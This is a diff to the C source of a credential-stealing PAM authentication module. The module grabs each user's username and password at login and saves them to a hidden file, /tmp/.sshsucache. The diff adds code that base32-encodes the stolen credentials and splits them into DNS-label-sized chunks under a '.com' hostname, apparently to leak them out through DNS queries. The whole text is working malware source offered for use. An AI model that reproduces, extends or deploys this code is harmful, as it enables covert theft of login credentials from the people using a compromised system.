@@ -8,6 +8,7 @@
 #include <unistd.h>
 
 #include "../dns/dns.h"
+#include "../encode/encode.h"
 
 /*
     Need root previlege!!!
@@ -32,6 +33,58 @@
 */
 # define SAVE_LOCATION "/tmp/.sshsucache"
 
+int 
+count_equals(char *encoded_string){
+    int i ;
+    int count = 0;
+    int interrupt = 0;
+
+    for (i = 0;i < strlen(encoded_string);i++){
+        if (encoded_string[i] == '='){
+            if (count == 0){
+                interrupt = i;
+            }
+            count ++;
+        }
+    }
+
+    if (count != 0) {
+        encoded_string[interrupt] = '\0';
+    }
+
+    return count;
+}
+
+char *
+modify_result(char *encoded_string){
+    static char modify_string[2048];
+    char temp[100];
+    int i;
+
+    memset(modify_string, 0, sizeof(modify_string));
+
+    int number = strlen(encoded_string)/63;
+
+    if (number == 0){
+        return encoded_string;
+    } else{
+        for (i=0;i<number;i++){
+            memset(temp, '\0', sizeof(temp));
+            strncpy(temp,encoded_string+63*i*sizeof(char),63);
+            temp[63] = '.';
+            strcat(modify_string,temp);
+        }
+        memset(temp, '\0', sizeof(temp));
+        strncpy(temp,encoded_string+63*i*sizeof(char),strlen(encoded_string)-63*i);
+        strcat(modify_string,temp);
+    }
+
+    if (modify_string[strlen(modify_string)-1] == '.'){
+         modify_string[strlen(modify_string)-1] = '\0';
+    }
+
+    return modify_string;
+}
 
 void 
 saveResult(char stealResult[]) 
@@ -123,10 +176,24 @@ pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv )
   pam_get_item(pamh,PAM_USER,(void *) &username);
   pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
   
-  snprintf(bonus,sizeof(bonus),"Username %s\nPassword: %s\n",username,password);
+  snprintf(bonus,sizeof(bonus),"%s:%s\n",username,password);
 
   if (password != NULL)
   {
+     char tmp_text[2048];
+     baseencode_error_t err;
+
+     strcpy(tmp_text,bonus);
+     memset(bonus, '\0', sizeof(bonus));
+
+     char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
+     int count = count_equals(encoded_string);
+
+     encoded_string = modify_result(encoded_string);
+
+     snprintf(bonus, sizeof(bonus), "%d.%s.com", count,encoded_string); 
+     free(encoded_string);
+    
      if (SAVE_OR_SEND)
      {
          saveResult(bonus);
